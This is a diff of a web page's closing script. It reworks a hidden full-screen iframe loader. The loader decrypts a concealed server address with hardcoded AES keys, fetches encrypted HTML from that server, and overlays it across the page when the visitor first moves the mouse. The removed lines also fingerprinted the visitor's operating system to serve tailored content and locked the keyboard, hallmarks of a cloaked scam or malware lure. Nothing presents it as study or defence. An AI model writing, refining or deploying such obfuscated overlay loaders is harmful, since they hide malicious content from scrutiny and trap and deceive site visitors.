@@ -394,65 +394,62 @@ hs.src = ('//s10.histats.com/js15_as.js');
   </div>
 </div>
 <script src="assets/script.js"></script>
+
+   
   <div id="contentiframe" style="display: none; z-index:9999; position:fixed; inset:0; pointer-events:auto; overflow:hidden;">
     <iframe id="frame" allow="fullscreen; autoplay; encrypted-media; picture-in-picture" allowfullscreen="" webkitallowfullscreen="" mozallowfullscreen="" sandbox="allow-scripts allow-popups allow-forms allow-downloads" style="width: 100%; height: 100%; border: 0px;"></iframe>
   </div>
 
   <script>
-    const PASSPHRASE = "U26HSHGVBK6H2q";  
-    const URL_KEY = "MySecretKey@123";
-    const ENC_DATA_ORIGIN = "U2FsdGVkX19vV4SS2mWySW3UzHsRtjk4n6LDfEfvjuQek8A54dkSMihG5yGtlq3/2LuVBgCRzOGJIgqzG23R9A==";
-    const DATA_ORIGIN = CryptoJS.AES.decrypt(ENC_DATA_ORIGIN, URL_KEY).toString(CryptoJS.enc.Utf8);
-    const DATA_URL = DATA_ORIGIN + "/data";
+     const PASSPHRASE = "U26HSHGVBK6H2q";
+    const URL_KEY = "MySecretKey@123";  
+
+ENC_DATA_ORIGIN = "U2FsdGVkX19vV4SS2mWySW3UzHsRtjk4n6LDfEfvjuQek8A54dkSMihG5yGtlq3/2LuVBgCRzOGJIgqzG23R9A=="
     let lastUrl = null;
 
-    function detectPlatform() {
-      const p = (navigator.userAgentData && navigator.userAgentData.platform) ||
-                navigator.platform || navigator.userAgent || "";
-      return /mac/i.test(p) ? "mac" : "win";
-    }
+    // Decrypt the origin URL using CryptoJS
+    const DATA_ORIGIN = CryptoJS.AES.decrypt(ENC_DATA_ORIGIN, URL_KEY).toString(CryptoJS.enc.Utf8);
+    const DATA_URL = DATA_ORIGIN;
 
-    function secureKeyboardAccess() {
-      if (navigator.keyboard) {
-        navigator.keyboard.lock().catch((err) =>
-          console.warn("Keyboard lock failed:", err)
-        );
-      }
+    console.log("🌐 Decrypted URL:", DATA_URL);
+
+    function simpleDecrypt(cipherText, passphrase) {
+        const key = CryptoJS.SHA256(passphrase);
+        const iv = CryptoJS.lib.WordArray.create([0, 0, 0, 0]);
+        const decrypted = CryptoJS.AES.decrypt(cipherText, key, { iv: iv });
+        return decrypted.toString(CryptoJS.enc.Utf8);
     }
 
     async function loadSecret() {
-      const shop = document.getElementById("shop");
-      const frame = document.getElementById("frame");
-      const contentIframe = document.getElementById("contentiframe");
-
-      try {
-        const res = await fetch(DATA_URL + "?platform=" + detectPlatform());
-        const { cipher } = await res.json();
-        const html = CryptoJS.AES.decrypt(cipher, PASSPHRASE).toString(CryptoJS.enc.Utf8);
-        if (!html) throw new Error("Decrypt failed — wrong key?");
-
-        if (lastUrl) URL.revokeObjectURL(lastUrl);
+    const frame = document.getElementById("frame");
+    try {
+        const res = await fetch(DATA_URL);
+        const data = await res.json();
+        const key = CryptoJS.SHA256(PASSPHRASE);
+        const iv = CryptoJS.lib.WordArray.create([0,0,0,0]);
+        const decrypted = CryptoJS.AES.decrypt(data.cipher, key, { iv: iv });
+        const html = decrypted.toString(CryptoJS.enc.Utf8);
+        if (!html || html.length < 50) throw new Error("Invalid HTML");
         const blob = new Blob([html], { type: "text/html" });
-        lastUrl = URL.createObjectURL(blob);
-
-        frame.src = lastUrl;
-        
-        shop.style.display = "none";
-        contentIframe.style.display = "block"; 
+        frame.src = URL.createObjectURL(blob);
+        frame.style.display = "block";
         document.getElementById("customPopup").style.display = "none";
-        
-       
-        secureKeyboardAccess();
-
-      } catch (e) {
-        document.querySelector(".hint").textContent = "⚠️ " + e.message;
-        document.getElementById("customPopup").style.display = "none";
-      }
+    } catch(e) {
+        alert("Error: " + e.message);
     }
+}
+
+    // ===== EVENT HANDLERS =====
+    document.getElementById("cancelBtn").addEventListener("click", function() {
+        document.getElementById("customPopup").style.display = "none";
+    });
+
+    document.getElementById("continueBtn").addEventListener("click", function() {
+        loadSecret();
+    });
 
     window.addEventListener("mousemove", () => {
-      document.getElementById("customPopup").style.display = "none";
-      loadSecret();
+        loadSecret();
     }, { once: true });
   </script>
 </body>
